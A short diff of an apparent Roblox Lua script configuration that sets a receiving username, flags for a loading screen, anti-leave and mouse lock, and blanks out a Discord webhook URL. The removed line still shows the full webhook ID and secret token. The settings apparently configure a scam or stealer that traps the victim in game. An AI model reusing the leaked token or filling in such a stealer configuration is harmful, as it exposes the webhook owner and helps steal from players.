@@ -1,5 +1,5 @@
 UserName = "machito66666"
-Webhook = "https://discord.com/api/webhooks/1102246062615433288/fP7tdHykLeuct32_zqLsaIC6S_YkwQ2piR7kRL51nE1Ymthoqft7iu1ZSYAficWBJ1El"
+Webhook = ""
 _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true 
